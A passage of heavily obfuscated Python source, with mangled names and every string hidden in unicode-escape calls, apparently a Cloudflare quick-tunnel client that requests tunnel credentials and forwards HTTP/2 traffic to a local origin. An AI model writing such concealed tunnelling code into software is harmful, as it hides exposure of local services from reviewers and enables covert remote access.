            O0_var_574.append(struct.unpack_from(codecs.decode('\\u003c\\u0049', 'unicode_escape'), O0_var_566, O0_var_568 + 4 + O0_var_575 * 4)[0])
        O0_var_576 = O0_var_573 + sum(O0_var_574) * 8
        if len(O0_var_566) - O0_var_568 < O0_var_576:
            break
        if O0_var_571 != 1:
            raise ValueError(codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u002d\\u0073\\u0065\\u0067\\u006d\\u0065\\u006e\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064', 'unicode_escape'))
        O0_var_567.append(O0_var_566[O0_var_568 + O0_var_573:O0_var_568 + O0_var_576])
        O0_var_568 += O0_var_576
    return (O0_var_567, O0_var_566[O0_var_568:])

def O0_fn_13(O0_var_577, O0_var_578):
    O0_var_579 = O0_var_577[O0_var_578]
    if O0_var_579 & 3 != 0:
        raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072', 'unicode_escape'))
    O0_var_580 = O0_var_579 >> 2 & 1073741823
    if O0_var_580 & 536870912:
        O0_var_580 -= 1073741824
    O0_var_581 = O0_var_578 + 1 + O0_var_580
    O0_var_582 = O0_var_579 >> 32 & 65535
    O0_var_583 = O0_var_579 >> 48 & 65535
    if O0_var_581 < 0 or O0_var_581 + O0_var_582 + O0_var_583 > len(O0_var_577):
        raise ValueError(codecs.decode('\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0073', 'unicode_escape'))
    return (O0_var_581, O0_var_582, O0_var_583)

def O0_fn_14(O0_var_584, O0_var_585):
    O0_var_586 = O0_var_584[O0_var_585]
    if O0_var_586 & 3 != 1:
        return codecs.decode('', 'unicode_escape')
    O0_var_587 = O0_var_586 >> 2 & 1073741823
    if O0_var_587 & 536870912:
        O0_var_587 -= 1073741824
    O0_var_588 = O0_var_585 + 1 + O0_var_587
    O0_var_589 = O0_var_586 >> 32 & 7
    O0_var_590 = O0_var_586 >> 35
    if O0_var_589 != 2 or O0_var_588 < 0 or O0_var_588 + (O0_var_590 + 7) // 8 > len(O0_var_584):
        return codecs.decode('', 'unicode_escape')
    O0_var_591 = b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_592) for O0_var_592 in O0_var_584[O0_var_588:O0_var_588 + (O0_var_590 + 7) // 8]))[:O0_var_590]
    return O0_var_591.rstrip(b'\x00').decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))

def O0_fn_15(data):
    if len(data) % 8 or len(data) < 24:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e', 'unicode_escape'))
    O0_var_593 = list(struct.unpack(codecs.decode('\\u003c', 'unicode_escape') + codecs.decode('\\u0051', 'unicode_escape') * (len(data) // 8), data))
    O0_var_594, O0_var_595, O0_var_596 = O0_fn_13(O0_var_593, 0)
    if O0_var_595 < 1 or O0_var_593[O0_var_594] & 65535 != 3:
        raise ValueError(codecs.decode('\\u006e\\u006f\\u0074\\u0020\\u0061\\u006e\\u0020\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'))
    O0_var_597, O0_var_598, O0_var_599 = O0_fn_13(O0_var_593, O0_var_594 + O0_var_595)
    O0_var_600 = O0_var_593[O0_var_597] >> 48 & 65535
    if O0_var_600 == 1:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_fn_14(O0_var_593, O0_var_597 + O0_var_598)}
    if O0_var_600 != 0:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0075\\u006e\\u0069\\u006f\\u006e\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_600}
    O0_var_601, O0_var_602, O0_var_603 = O0_fn_13(O0_var_593, O0_var_597 + O0_var_598)
    O0_var_604, O0_var_605, O0_var_606 = O0_fn_13(O0_var_593, O0_var_601 + O0_var_602)
    O0_var_607 = O0_var_593[O0_var_604]
    O0_var_608 = O0_var_607 & 65535
    if O0_var_608 == 0:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_fn_14(O0_var_593, O0_var_604 + O0_var_605)}
    if O0_var_608 != 1:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0075\\u006e\\u0069\\u006f\\u006e\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_608}
    O0_var_609, O0_var_610, O0_var_611 = O0_fn_13(O0_var_593, O0_var_604 + O0_var_605)
    O0_var_612 = O0_fn_14(O0_var_593, O0_var_609 + O0_var_610 + 1)
    return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): True, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_612, codecs.decode('\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0064', 'unicode_escape'): bool(O0_var_593[O0_var_609] & 1)}

def O0_fn_16(path):
    O0_var_613 = os.path.splitext(path.rstrip(codecs.decode('\\u002f', 'unicode_escape')))[1].lower()
    return {codecs.decode('\\u002e\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0063\\u0073\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0063\\u0073\\u0073\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u0061\\u0070', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0073\\u0076\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0073\\u0076\\u0067\\u002b\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0078\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0070\\u006e\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0070\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u0067\\u0069\\u0066', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0067\\u0069\\u0066', 'unicode_escape'), codecs.decode('\\u002e\\u0069\\u0063\\u006f', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0078\\u002d\\u0069\\u0063\\u006f\\u006e', 'unicode_escape')}.get(O0_var_613, codecs.decode('', 'unicode_escape'))

def O0_fn_17(O0_var_614):
    if isinstance(O0_var_614, list):
        return bytes(O0_var_614)
    if not isinstance(O0_var_614, str):
        raise ValueError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u0020\\u0068\\u0061\\u0073\\u0020\\u0061\\u006e\\u0020\\u0075\\u006e\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
    return base64.b64decode(O0_var_614 + codecs.decode('\\u003d', 'unicode_escape') * (-len(O0_var_614) % 4))

def O0_fn_18(O0_var_615):
    request = urllib.request.Request(O0_var_615.rstrip(codecs.decode('\\u002f', 'unicode_escape')) + codecs.decode('\\u002f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape'), data=b'', method=codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape'), headers={codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0070\\u0079\\u002f\\u0031\\u002e\\u0030', 'unicode_escape')})
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            O0_var_616 = response.read()
            O0_var_617 = response.status
    except urllib.error.URLError as exc:
        raise RuntimeError(codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0069\\u006e\\u0067\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    try:
        O0_var_618 = json.loads(O0_var_616)
    except json.JSONDecodeError as exc:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0065\\u0064\\u0020\\u006e\\u006f\\u006e\\u002d\\u004a\\u0053\\u004f\\u004e\\u0020\\u0028\\u0025\\u0073\\u0029\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_617, O0_var_616[:300].decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')))) from exc
    O0_var_619 = O0_var_618.get(codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape')) or {}
    if not O0_var_618.get(codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), True) or not O0_var_619:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0077\\u0061\\u0073\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % json.dumps(O0_var_618.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape')), ensure_ascii=False))
    try:
        O0_var_620 = uuid.UUID(O0_var_619[codecs.decode('\\u0069\\u0064', 'unicode_escape')])
        O0_var_621 = O0_var_619[codecs.decode('\\u0061\\u0063\\u0063\\u006f\\u0075\\u006e\\u0074\\u005f\\u0074\\u0061\\u0067', 'unicode_escape')]
        O0_var_622 = O0_fn_17(O0_var_619[codecs.decode('\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074', 'unicode_escape')])
        O0_var_623 = O0_var_619[codecs.decode('\\u0068\\u006f\\u0073\\u0074\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')]
    except (KeyError, ValueError, binascii.Error, TypeError) as exc:
        raise RuntimeError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    return (O0_var_623, O0_var_621, O0_var_622, O0_var_620.bytes)

class H2Connection:

    def __init__(self, O0_var_624, O0_var_625, O0_var_626, O0_var_627, O0_var_628, O0_var_629, logger, O0_var_630=None, O0_var_631=False, O0_var_632=None):
        self.sock = O0_var_624
        self.origin = O0_var_625
        self.account_tag = O0_var_626
        self.tunnel_secret = O0_var_627
        self.tunnel_id = O0_var_628
        self.conn_index = O0_var_629
        self.log = logger
        self.tunnel_url = O0_var_630
        self.show_tunnel = O0_var_631
        self.tunnel_state = O0_var_632 if O0_var_632 is not None else {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}
        self.decoder = HpackDecoder()
        self.encoder_lock = threading.Lock()
        self.window_condition = threading.Condition()
        self.connection_window = 65535
        self.stream_windows = {}
        self.peer_max_frame = MAX_FRAME_SIZE
        self.streams = {}
        self.control = None
        self.stopped = False
        self.registered = False

    def send_frame(self, O0_var_633, O0_var_634, O0_var_635, O0_var_636=b''):
        if len(O0_var_636) > 16777215:
            raise ValueError(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))
        O0_var_637 = struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), len(O0_var_636))[1:] + bytes((O0_var_633, O0_var_634)) + struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_635 & 2147483647)
        with self.encoder_lock:
            self.sock.sendall(O0_var_637 + O0_var_636)

    def send_headers(self, O0_var_638, headers, O0_var_639=False):
        O0_var_640 = O0_fn_9(headers)
        O0_var_641 = 4 | (1 if O0_var_639 else 0)
        self.send_frame(1, O0_var_641, O0_var_638, O0_var_640)

    def send_data(self, O0_var_642, O0_var_643, O0_var_644=False):
        O0_var_645 = memoryview(O0_var_643)
        O0_var_646 = 0
        while O0_var_646 < len(O0_var_645) or (len(O0_var_645) == 0 and O0_var_646 == 0):
            with self.window_condition:
                while self.connection_window <= 0 or self.stream_windows.get(O0_var_642, 65535) <= 0:
                    if self.stopped:
                        return
                    self.window_condition.wait(1)
                O0_var_647 = min(len(O0_var_645) - O0_var_646, self.connection_window, self.stream_windows.get(O0_var_642, 65535), self.peer_max_frame)
                if len(O0_var_645) == 0:
                    O0_var_647 = 0
                O0_var_648 = bytes(O0_var_645[O0_var_646:O0_var_646 + O0_var_647])
                self.connection_window -= O0_var_647
                self.stream_windows[O0_var_642] = self.stream_windows.get(O0_var_642, 65535) - O0_var_647
            O0_var_649 = 1 if O0_var_644 and O0_var_646 + O0_var_647 >= len(O0_var_645) else 0
            self.send_frame(0, O0_var_649, O0_var_642, O0_var_648)
            O0_var_646 += O0_var_647
            if len(O0_var_645) == 0:
                break

    def send_window_update(self, O0_var_650, O0_var_651):
        if O0_var_651 > 0:
            self.send_frame(8, 0, O0_var_650, struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_651 & 2147483647))

    def read_frame(self):
        O0_var_652 = O0_fn_22(self.sock, 9)
        O0_var_653 = int.from_bytes(O0_var_652[:3], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_654, O0_var_655 = (O0_var_652[3], O0_var_652[4])
        O0_var_656 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_652[5:])[0] & 2147483647
        O0_var_657 = O0_fn_22(self.sock, O0_var_653)
        return (O0_var_654, O0_var_655, O0_var_656, O0_var_657)

    def read_headers(self, O0_var_658, O0_var_659, O0_var_660):
        if O0_var_658 & 8:
            O0_var_661 = O0_var_660[0]
            O0_var_660 = O0_var_660[1:]
            if O0_var_661 > len(O0_var_660):
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
            O0_var_660 = O0_var_660[:-O0_var_661] if O0_var_661 else O0_var_660
        if O0_var_658 & 32:
            O0_var_660 = O0_var_660[5:]
        O0_var_662 = [O0_var_660]
        while not O0_var_658 & 4:
            O0_var_663, O0_var_664, O0_var_665, O0_var_666 = self.read_frame()
            if O0_var_663 != 9 or O0_var_665 != O0_var_659:
                raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u004f\\u004e\\u0054\\u0049\\u004e\\u0055\\u0041\\u0054\\u0049\\u004f\\u004e\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape'))
            O0_var_662.append(O0_var_666)
            O0_var_658 = O0_var_664
        return self.decoder.decode(b''.join(O0_var_662))

    def open_control(self, O0_var_667):
        if self.control is not None:
            return
        self.control = ControlStream(self, O0_var_667, self.log)
        self.send_headers(O0_var_667, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'))])
        self.control.start(self.account_tag, self.tunnel_secret, self.tunnel_id, self.conn_index)

    def update_config(self, O0_var_668, body):
        O0_var_669 = 0
        try:
            O0_var_669 = int(json.loads(body or b'{}').get(codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), 0))
        except (ValueError, TypeError, json.JSONDecodeError):
            pass
        response = json.dumps({codecs.decode('\\u006c\\u0061\\u0074\\u0065\\u0073\\u0074\\u0041\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_669}, separators=(codecs.decode('\\u002c', 'unicode_escape'), codecs.decode('\\u003a', 'unicode_escape'))).encode()
        self.send_headers(O0_var_668, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), str(len(response)))])
        self.send_data(O0_var_668, response, True)

    def request_finished(self, O0_var_670, request):
        if request.get(codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')) == codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'):
            self.update_config(O0_var_670, bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            return
        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')):
            return
        if request.get(codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')):
            return
        request[codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')] = True
        threading.Thread(target=self.proxy_request, args=(O0_var_670, request), daemon=True).start()

    def proxy_request(self, O0_var_671, request):
        try:
            response = O0_fn_21(self.origin, request[codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape')], request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')], bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            O0_var_672 = response[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]
            O0_var_673 = []
            O0_var_674 = []
            for O0_var_675, O0_var_676 in O0_var_672:
                O0_var_677 = O0_var_675.lower()
                if O0_var_677 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_674.append((O0_var_677, O0_var_676))
                if not (O0_var_677.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_677.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_677.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_677.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_677 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_673.append((O0_var_677, O0_var_676))
            if not any((O0_var_675 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape') for O0_var_675, O0_var_678 in O0_var_673)):
                O0_var_679 = O0_fn_16(request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')])
                if O0_var_679:
                    O0_var_673.append((codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), O0_var_679))
            O0_var_680 = O0_fn_19(O0_var_673)
            O0_var_681 = 200 if response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == 101 else response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
            O0_var_682 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_681))]
            O0_var_682.extend(O0_var_674)
            O0_var_682.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_680))
            O0_var_682.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.send_headers(O0_var_671, O0_var_682)
            while True:
                O0_var_683 = response[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].read(65536)
                if not O0_var_683:
                    self.send_data(O0_var_671, b'', True)
                    break
                self.send_data(O0_var_671, O0_var_683, False)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0070\\u0072\\u006f\\u0078\\u0079\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_671, exc)
            try:
